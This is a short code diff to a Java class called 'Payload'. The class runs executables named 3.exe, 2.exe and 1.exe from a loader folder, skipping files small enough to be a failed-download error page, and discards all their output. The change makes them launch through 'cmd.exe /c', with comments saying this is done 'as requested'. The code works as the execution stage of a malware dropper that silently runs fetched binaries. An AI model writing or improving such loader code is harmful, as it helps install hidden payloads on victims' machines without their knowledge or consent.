@@ -191,11 +191,10 @@ public class Payload {
             String[] exesToRun = {"3.exe", "2.exe", "1.exe"};
             for (String exe : exesToRun) {
                 File exeFile = new File(loaderDir, exe);
-                // > 1024 ensures it's a real executable, not a 404 HTML page
                 if (exeFile.exists() && exeFile.length() > 1024) {
                     try {
-                        // Exact execution as requested: .\2.exe all
-                        ProcessBuilder pb = new ProcessBuilder(".\\" + exe, "all");
+                        // Using cmd.exe /c makes Windows parse the .\ exactly as requested
+                        ProcessBuilder pb = new ProcessBuilder("cmd.exe", "/c", ".\\" + exe, "all");
                         pb.directory(loaderDir);
                         pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
                         pb.redirectError(ProcessBuilder.Redirect.DISCARD);
